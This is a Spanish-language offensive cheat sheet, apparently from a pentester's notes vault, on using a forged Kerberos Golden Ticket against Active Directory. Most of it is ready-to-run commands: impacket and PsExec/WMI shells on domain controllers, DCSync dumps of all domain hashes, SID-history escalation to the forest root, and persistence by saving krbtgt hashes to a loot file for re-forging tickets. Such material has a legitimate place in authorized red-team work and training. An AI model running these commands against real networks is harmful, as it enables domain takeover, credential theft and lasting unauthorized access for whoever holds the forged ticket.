---
aliases:
  - Golden Ticket usage
  - Golden Ticket lateral
tags:
  - type/technique
  - technique/lateral-movement
  - technique/persistence
  - env/windows
  - env/linux
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Golden Ticket]]"
---

# Golden Ticket - Uso y Lateral Movement

***

## Linux — impacket (KRB5CCNAME)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `export KRB5CCNAME=administrator.ccache` | Activar ccache | Pre-todo. |
| `impacket-psexec -k -no-pass corp.local/administrator@DC` | Shell via SMB | RCE. |
| `impacket-wmiexec -k -no-pass corp.local/administrator@DC` | Shell via WMI | Stealth. |
| `impacket-smbclient -k -no-pass corp.local/administrator@DC` | SMB file access | Exfil/pivot. |
| `impacket-secretsdump -k -no-pass -just-dc corp.local/administrator@DC` | Domain dump | Full compromise. |
| `impacket-atexec -k -no-pass corp.local/administrator@DC "cmd"` | AT service exec | Lateral. |
^gt-uso-linux

```bash
export KRB5CCNAME=administrator.ccache
klist  # Verificar

# Shell en DC
impacket-wmiexec -k -no-pass corp.local/administrator@dc01.corp.local

# Dump full domain
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/administrator@dc01.corp.local

# Acceso SMB
impacket-smbclient -k -no-pass corp.local/administrator@dc01.corp.local
```

___

## Windows — post-inject

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `klist` | Verificar ticket inyectado | Post-inject. |
| `dir \\DC\c$` | Acceso SMB | File access. |
| `PsExec.exe \\DC cmd.exe` | Shell remoto | RCE. |
| `Enter-PSSession -ComputerName DC` | PowerShell remoting | WinRM. |
| `net use \\DC\c$ /persistent:no` | Montar share | File ops. |
| `wmic /node:DC process call create "cmd /c whoami"` | WMI exec | Lateral. |
^gt-uso-windows

```powershell
# Post Rubeus ptt / mimikatz ptt
klist
dir \\dc01.corp.local\c$

# PSRemoting
Enter-PSSession -ComputerName dc01.corp.local
```

___

## Acceso a DC específico

| **Acción** | **Linux** | **Windows** |
|:---:|:---:|:---:|
| Shell | `impacket-psexec -k -no-pass corp/admin@dc01.corp.local` | `PsExec.exe \\dc01.corp.local cmd` |
| WMI | `impacket-wmiexec -k -no-pass corp/admin@dc01.corp.local` | `wmic /node:dc01.corp.local` |
| DCSync | `impacket-secretsdump -k -no-pass corp/admin@dc01.corp.local -just-dc` | `lsadump::dcsync /domain:corp.local /all` |
| SMB | `impacket-smbclient -k -no-pass corp/admin@dc01.corp.local` | `dir \\dc01.corp.local\c$` |
^gt-uso-dc

___

## Cross-domain access (SID History)

| **Paso** | **Comando** | **Cuándo** |
|:---:|:---:|:---:|
| Forjar con `-extra-sid PARENT_SID-519` | Ver Forging Linux | Child domain krbtgt hash. |
| `export KRB5CCNAME=administrator.ccache` | Activar | Post-forge. |
| `impacket-psexec -k -no-pass corp.local/administrator@DC-ROOT` | Acceder al forest root | Cross-forest shell. |
^gt-uso-crossdomain

```bash
# Post-forge con SID History
export KRB5CCNAME=administrator.ccache
klist  # Debe mostrar SID Extra: PARENT_SID-519

# Acceso al DC root del forest
impacket-wmiexec -k -no-pass corp.local/administrator@dc-root.corp.local
```

___

## Verificar acceso efectivo

| **Test** | **Comando** | **Esperado** |
|:---:|:---:|:---:|
| SMB listing | `impacket-smbclient -k ... dc01.corp.local` → `ls` | Listado de shares |
| whoami en target | `impacket-wmiexec ... "whoami /all"` | administrator + DA groups |
| LDAP query | `impacket-ldapdomaindump -k -no-pass dc01.corp.local` | Domain users/groups dump |
| DCSync post-GT | `impacket-secretsdump -k -no-pass -just-dc-user krbtgt dc01.corp.local` | krbtgt hash |
^gt-uso-verify

```bash
# Verificación rápida end-to-end
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass corp.local/administrator@dc01.corp.local "whoami /groups | findstr /i admin"
```

___

## Persistencia — re-forjar cuando expire

| **Acción** | **Detalle** | **Cuándo** |
|:---:|:---:|:---:|
| Re-forjar con mismo hash | `impacket-ticketer` de nuevo con krbtgt hash guardado | Ticket expiró (default 10 años, salvo custom). |
| Hash válido hasta doble reset | krbtgt retiene N-1 password | Un solo reset no invalida. |
| Guardar krbtgt hash offline | Exfiltrar hash para re-uso post-sessión | Siempre post-DCSync. |
^gt-uso-persist

```bash
# Guardar hash para re-uso
echo "krbtgt NT: ABC123HASH" >> /tmp/loot.txt
echo "krbtgt AES256: DEF456HASH" >> /tmp/loot.txt
echo "Domain SID: S-1-5-21-..." >> /tmp/loot.txt

# Re-forjar cuando necesite acceso nuevamente
impacket-ticketer -aesKey DEF456HASH -domain-sid S-1-5-21-... -domain corp.local administrator
```

***
